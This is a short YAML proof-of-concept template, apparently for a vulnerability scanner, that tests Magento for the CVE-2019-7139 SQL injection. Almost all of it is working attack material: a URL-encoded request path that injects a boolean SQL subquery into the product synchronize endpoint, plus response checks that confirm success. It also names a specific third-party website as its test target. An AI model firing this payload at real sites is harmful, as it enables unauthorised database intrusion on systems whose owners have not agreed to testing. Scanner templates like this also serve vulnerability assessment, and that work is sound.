name: poc-yaml-magento22-cve-2019-7139
rules:
  - method: GET
    path: /catalog/product_frontend_action/synchronize%3ftype_id%3drecently_products%26ids[0][added_at]%3d%26ids[0][product_id][from]%3d%3f%26ids[0][product_id][to]%3d)))+OR+(SELECT+1+UNION+SELECT+2+FROM+DUAL+WHERE+%25s)+--+-
    expression: |
      response.status == 400 && response.body.bcontains(b"[]") && response.headers["set-cookie"].contains("PHPSESSID") && response.content_type.contains("application/json")
detail:
  author: 蟋蟀哥哥
  Affected Version: "magento/core package versions <1.9.4.1"
  links:
    - https://github.com/ambionics/magento-exploits/blob/master/magento-sqli.py
    - https://www.ambionics.io/blog/magento-sqli
    - https://nvd.nist.gov/vuln/detail/CVE-2019-7139
    - http://www.security-database.com/detail.php?alert=CVE-2019-7139
test:
  target: https://www.itpurse.cn/
